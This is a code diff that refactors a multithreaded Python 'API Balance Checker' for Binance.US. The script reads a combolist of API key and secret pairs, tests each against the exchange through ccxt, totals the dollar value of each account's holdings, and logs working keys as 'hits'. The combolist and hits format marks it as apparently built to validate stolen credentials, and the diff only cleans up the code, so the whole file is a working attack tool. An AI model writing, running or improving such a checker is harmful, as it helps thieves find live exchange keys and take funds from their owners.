@@ -1,11 +1,18 @@
-import os, threading, ctypes, time, easygui, ccxt, requests
-from colorama import Fore, Back, Style, init
+import os
+import threading
+import ctypes
+import time
+import easygui
+import ccxt
+import requests
+from colorama import Fore, init
 
-def center(var:str, space:int=None): # From Pycenter
+def center(var, space=None):
     if not space:
-        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
-    
+        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) // 2
+
     return "\n".join((' ' * int(space)) + var for var in var.splitlines())
+
 
 class BiUS:
     def __init__(self):
@@ -18,8 +25,8 @@ class BiUS:
 
     def ui(self):
         os.system('cls')
-        ctypes.windll.kernel32.SetConsoleTitleW(f'[BinUS API Balance Checker - Made by R3DActual#6969]') 
-        text = '''    
+        ctypes.windll.kernel32.SetConsoleTitleW('[BinUS API Balance Checker - Made by R3DActual#6969]')
+        text = '''
                     ▄▄▄▄    ██▓ ███▄    █     █    ██   ██████ 
                     ▓█████▄ ▓██▒ ██ ▀█   █     ██  ▓██▒▒██    ▒ 
                     ▒██▒ ▄██▒██▒▓██  ▀█ ██▒   ▓██  ▒██░░ ▓██▄   
@@ -29,7 +36,7 @@ class BiUS:
                     ▒░▒   ░  ▒ ░░ ░░   ░ ▒░   ░░▒░ ░ ░ ░ ░▒  ░ ░
                     ░    ░  ▒ ░   ░   ░ ░     ░░░ ░ ░ ░  ░  ░  
                     ░       ░           ░       ░           ░  
-                        ░                                     '''        
+                        ░                                     '''
         faded = ''
         red = 40
         for line in text.splitlines():
@@ -40,30 +47,33 @@ class BiUS:
                     red = 255
         print(center(faded))
 
-    def updateTitle(self):
+    def update_title(self):
         while True:
             elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
-            ctypes.windll.kernel32.SetConsoleTitleW(f'[BinUS API Balance Checker - Made by R3DActual#6969] - Hits: {self.hits} | Invalids: {self.bad} | Errors: {self.error} | Threads: {self.hits+self.bad+self.error}/{len(self.combos)} | Time elapsed: {elapsed}')
+            ctypes.windll.kernel32.SetConsoleTitleW(
+                f'[BinUS API Balance Checker - Made by R3DActual#6969] - Hits: {self.hits} | Invalids: {self.bad} | Errors: {self.error} | Threads: {self.hits+self.bad+self.error}/{len(self.combos)} | Time elapsed: {elapsed}')
             time.sleep(0.4)
-    
-    def getCombos(self):
+
+    def get_combos(self):
         try:
             print(f'[{Fore.CYAN}>{Fore.LIGHTWHITE_EX}] Path to API Key Combolist(API:SECRET)> ')
-            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'BinUS API Balance Checker - Select API Key Combo(API:SECRET)', multiple= False)
+            path = easygui.fileopenbox(default='*.txt',
+                                       filetypes=['*.txt'],
+                                       title='BinUS API Balance Checker - Select API Key Combo(API:SECRET)',
+                                       multiple=False)
             with open(path, 'r', encoding="utf-8") as f:
-                for l in f:
-                    self.combos.append(l.replace('\n', ''))
+                self.combos = [line.strip() for line in f]
         except:
             print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open combofile')
             os.system('pause >nul')
             quit()
 
-    def checker(self, apikey, apisec):
+    def checker(self, api_key, api_secret):
         try:
             bius = ccxt.binanceus({
                 'enableRateLimit': True,
-                'apiKey': apikey,
-                'secret': apisec
+                'apiKey': api_key,
+                'secret': api_secret
             })
             bal = bius.fetch_balance()
             tickers = bius.fetch_tickers()
@@ -77,52 +87,48 @@ class BiUS:
                         valuation = amount * ticker['last']
                         total_destination_value += valuation
             if total_destination_value != 0:
-                self.lock.acquire()
-                print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.MAGENTA}HIT{Fore.RESET} | {apikey} | {apisec} | ${total_destination_value}')
-                self.hits += 1
-                with open('hits.txt', 'a', encoding='utf-8') as fp:
-                    fp.writelines(f'{apikey}:{apisec} | Total: ${total_destination_value}\n')
-                
-                self.lock.release()
+                with self.lock:
+                    print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.MAGENTA}HIT{Fore.RESET} | {api_key} | {api_secret} | ${total_destination_value}')
+                    self.hits += 1
+                    with open('hits.txt', 'a', encoding='utf-8') as fp:
+                        fp.writelines(f'{api_key}:{api_secret} | Total: ${total_destination_value}\n')
             else:
-                self.lock.acquire()
-                self.bad += 1
-                with open('bads.txt', 'a', encoding='utf-8') as fp:
-                    fp.writelines(f'{apikey}:{apisec}\n')
-                self.lock.release()
+                with self.lock:
+                    self.bad += 1
+                    with open('bads.txt', 'a', encoding='utf-8') as fp:
+                        fp.writelines(f'{api_key}:{api_secret}\n')
         except:
-            self.lock.acquire()
-            self.error += 1
-            with open('invalids.txt', 'a', encoding='utf-8') as fp:
-                fp.writelines(f'{apikey}:{apisec}\n')
-            self.lock.release()
+            with self.lock:
+                self.error += 1
+                with open('invalids.txt', 'a', encoding='utf-8') as fp:
+                    fp.writelines(f'{api_key}:{api_secret}\n')
 
     def worker(self, combos, thread_id):
         while self.check[thread_id] < len(combos):
             combination = combos[self.check[thread_id]].split(':')
             self.checker(combination[0], combination[1])
-            self.check[thread_id] += 1 
+            self.check[thread_id] += 1
 
     def main(self):
-        self.getCombos()
+        self.get_combos()
         try:
             self.threadcount = int(input(f'[{Fore.CYAN}>{Fore.RESET}] Threads> '))
             if self.threadcount < 1 or self.threadcount > 50:
-                raise ValueError #this will send it to the print message and back to the input option
+                raise ValueError
         except ValueError:
             print(f'[{Fore.RED}!{Fore.RESET}] Value must be an integer between 1-50')
             os.system('pause >nul')
             quit()
-        
+
         self.ui()
         self.start = time.time()
-        threading.Thread(target =self.updateTitle, daemon =True).start()
+        threading.Thread(target=self.update_title, daemon=True).start()
 
         threads = []
-        self.check = [0 for i in range(self.threadcount)]
+        self.check = [0 for _ in range(self.threadcount)]
         for i in range(self.threadcount):
-            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
-            t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
+            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos) / self.threadcount * (i + 1))]
+            t = threading.Thread(target=self.worker, args=(sliced_combo, i,))
             threads.append(t)
             t.start()
 
@@ -131,6 +137,7 @@ class BiUS:
 
         print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
         os.system('pause>nul')
+
 
 n = BiUS()
 n.main()
